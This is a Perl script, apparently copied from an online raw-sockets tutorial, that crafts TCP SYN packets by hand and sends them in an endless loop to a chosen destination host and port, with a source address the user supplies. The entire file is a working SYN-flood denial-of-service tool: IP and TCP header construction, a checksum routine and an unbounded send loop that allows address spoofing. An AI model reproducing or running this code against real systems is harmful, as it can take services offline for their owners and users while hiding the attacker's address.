#!/usr/local/bin/perl
#http://www.binarytides.com/syn-flood-program-in-perl-using-raw-sockets-linux/
#Program to send out tcp syn packets using raw sockets on linux

use Socket;

$src_host = $ARGV[0]; # The source IP/Hostname
$src_port = $ARGV[1]; # The Source Port
$dst_host = $ARGV[2]; # The Destination IP/Hostname
$dst_port = $ARGV[3]; # The Destination Port.

if(!defined $src_host or !defined $src_port or !defined $dst_host or !defined $dst_port) 
{
	# print usage instructions
	print "Usage: $0 <source host> <source port> <dest host> <dest port>\n";
	exit;
} 
else 
{
	# call the main function
	main();
}
 
sub main 
{
	my $src_host = (gethostbyname($src_host))[4];
	my $dst_host = (gethostbyname($dst_host))[4];
	
	# when IPPROTO_RAW is used IP_HDRINCL is not needed
	$IPROTO_RAW = 255;
	socket($sock , AF_INET, SOCK_RAW, $IPROTO_RAW) 
		or die $!;
	
	#set IP_HDRINCL to 1, this is necessary when the above protocol is something other than IPPROTO_RAW
	#setsockopt($sock, 0, IP_HDRINCL, 1);

	my ($packet) = makeheaders($src_host, $src_port, $dst_host, $dst_port);
	
	my ($destination) = pack('Sna4x8', AF_INET, $dst_port, $dst_host);
	
	while(1)
	{
		send($sock , $packet , 0 , $destination)
			or die $!;
	}
}

sub makeheaders 
{
	$IPPROTO_TCP = 6;
	local($src_host , $src_port , $dst_host , $dst_port) = @_;
	
	my $zero_cksum = 0;

	# Lets construct the TCP half
	my $tcp_len = 20;
	my $seq = 13456;
	my $seq_ack = 0;
	
	my $tcp_doff = "5";
	my $tcp_res = 0;
	my $tcp_doff_res = $tcp_doff . $tcp_res;
	
	# Flag bits
	my $tcp_urg = 0; 
	my $tcp_ack = 0;
	my $tcp_psh = 0;
	my $tcp_rst = 0;
	my $tcp_syn = 1;
	my $tcp_fin = 0;
	my $null = 0;
	
	my $tcp_win = 124;
	
	my $tcp_urg_ptr = 44;
	my $tcp_flags = $null . $null . $tcp_urg . $tcp_ack . $tcp_psh . $tcp_rst . $tcp_syn . $tcp_fin ;
	
	my $tcp_check = 0;
	
	#create tcp header with checksum = 0
	my $tcp_header = pack('nnNNH2B8nvn' , $src_port , $dst_port , $seq, $seq_ack , $tcp_doff_res, $tcp_flags,  $tcp_win , $tcp_check, $tcp_urg_ptr);
	
	my $tcp_pseudo = pack('a4a4CCn' , $src_host, $dst_host, 0, $IPPROTO_TCP, length($tcp_header) ) . $tcp_header;
	
	$tcp_check = &checksum($tcp_pseudo);
	
	#create tcp header with checksum = 0
	my $tcp_header = pack('nnNNH2B8nvn' , $src_port , $dst_port , $seq, $seq_ack , $tcp_doff_res, $tcp_flags,  $tcp_win , $tcp_check, $tcp_urg_ptr);
	
	# Now lets construct the IP packet
	my $ip_ver = 4;
	my $ip_len = 5;
	my $ip_ver_len = $ip_ver . $ip_len;
	
	my $ip_tos = 00;
	my $ip_tot_len = $tcp_len + 20;
	my $ip_frag_id = 19245;
	my $ip_ttl = 25;
	my $ip_proto = $IPPROTO_TCP;	# 6 for tcp
	my $ip_frag_flag = "010";
	my $ip_frag_oset = "0000000000000";
	my $ip_fl_fr = $ip_frag_flag . $ip_frag_oset;
	
	# ip header
	# src and destination should be a4 and a4 since they are already in network byte order
	my $ip_header = pack('H2CnnB16CCna4a4',	$ip_ver_len, $ip_tos, $ip_tot_len, $ip_frag_id,	$ip_fl_fr , $ip_ttl , $ip_proto , $zero_cksum , $src_host , $dst_host);
	
	# final packet
	my $pkt = $ip_header . $tcp_header;
	
	# packet is ready
	return $pkt;
}


#Function to calculate checksum - used in both ip and tcp headers
sub checksum 
{
	# This of course is a blatent rip from _the_ GOD,
	# W. Richard Stevens.

	my ($msg) = @_;
	my ($len_msg,$num_short,$short,$chk);
	$len_msg = length($msg);
	$num_short = $len_msg / 2;
	$chk = 0;
	
	foreach $short (unpack("S$num_short", $msg)) 
	{
		$chk += $short;
	}
	
	$chk += unpack("C", substr($msg, $len_msg - 1, 1)) if $len_msg % 2;
	$chk = ($chk >> 16) + ($chk & 0xffff);
	
	return(~(($chk >> 16) + $chk) & 0xffff);
} 

